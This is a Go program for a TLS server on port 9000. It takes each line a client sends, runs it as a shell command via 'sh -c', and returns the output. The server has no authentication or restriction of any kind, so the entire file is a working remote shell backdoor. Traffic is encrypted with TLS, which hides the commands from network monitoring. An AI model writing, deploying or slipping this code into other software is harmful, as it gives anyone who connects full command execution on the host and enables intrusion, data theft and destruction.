package main

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"os/exec"
)

const port = "9000"

func handleConnection(conn *tls.Conn) {
	defer conn.Close()
	fmt.Println("Client connected:", conn.RemoteAddr())

	reader := bufio.NewReader(conn)

	for {
		command, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println("Client disconnected")
			return
		}

		command = command[:len(command)-1] // Remove \n
		fmt.Println("Executing command:", command)

		// Execute system command
		cmd := exec.Command("sh", "-c", command)
		output, err := cmd.CombinedOutput()

		if err != nil {
			conn.Write([]byte("Error executing: " + err.Error() + "\n"))
		}

		conn.Write(output)
	}
}

func main() {
	// Load TLS certificate
	cert, err := tls.LoadX509KeyPair("cert.pem", "key.pem")
	if err != nil {
		fmt.Println("Error loading certificate:", err)
		return
	}

	// Configure TLS
	config := &tls.Config{Certificates: []tls.Certificate{cert}}

	// Start TLS server
	listener, err := tls.Listen("tcp", ":"+port, config)
	if err != nil {
		fmt.Println("Server run error:", err)
		return
	}
	defer listener.Close()

	fmt.Println("TLS Server is waiting for connections on port:", port)

	for {
		conn, err := listener.Accept()
		if err != nil {
			fmt.Println("Connection error:", err)
			continue
		}
		go handleConnection(conn.(*tls.Conn))
	}
}